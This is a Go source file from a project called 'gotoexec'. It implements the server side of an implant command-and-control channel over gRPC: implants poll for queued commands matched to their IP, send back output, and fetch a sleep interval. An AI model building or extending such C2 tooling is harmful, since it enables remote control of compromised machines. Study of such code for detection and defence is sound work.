/*
 * @Description:
 * @Version: 2.0
 * @Autor: ABing
 * @Date: 2024-06-19 11:23:41
 * @LastEditors: lhl
 * @LastEditTime: 2024-06-20 15:10:13
 */
package implant

import (
	"context"
	"errors"
	"gotoexec/config"
	"gotoexec/global"
	"gotoexec/grpcapi"
	"log"
	"net"
	"time"

	"google.golang.org/grpc/peer"
)

type implantServer struct {
	work, output chan *grpcapi.Command
}

func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	return s
}

var ipErrtime map[string]string

func init() {
	ipErrtime = make(map[string]string)
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {

	p, ok := peer.FromContext(ctx)
	if !ok {
		log.Println("Failed to get peer info")
	}

	clientIP, _, err := net.SplitHostPort(p.Addr.String())
	if err != nil {
		log.Printf("Failed to parse client IP: %v", err)
	}

	log.Printf("Client IP: %s", clientIP)

	global.FixedSizeStackInstance.Push(global.LoginLog{Ip: clientIP, Time: time.Now().Unix()})

	var cmd = new(grpcapi.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {

			if cmd.Ip != clientIP {

				errip := ipErrtime[cmd.Ip]

				//这个ip已经拒绝过
				if errip == clientIP {
					log.Println("第二次不是我的")
					cmd.Out = "off"
					s.output <- cmd
					return nil, errors.New("第二次不是我的")
				}

				s.work <- cmd

				log.Println("不是客户端", clientIP, "的数据,是", cmd.Ip)

				ipErrtime[cmd.Ip] = clientIP
				log.Println("第一次不是我的")
				return cmd, errors.New("第一次不是我的")
			}

			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		return cmd, nil
	}
}
func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	return &grpcapi.Empty{}, nil
}
func (s *implantServer) GetSleepTime(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.SleepTime, error) {
	time := new(grpcapi.SleepTime)
	time.Time = config.CoreConf.SleepTime
	return time, nil
}
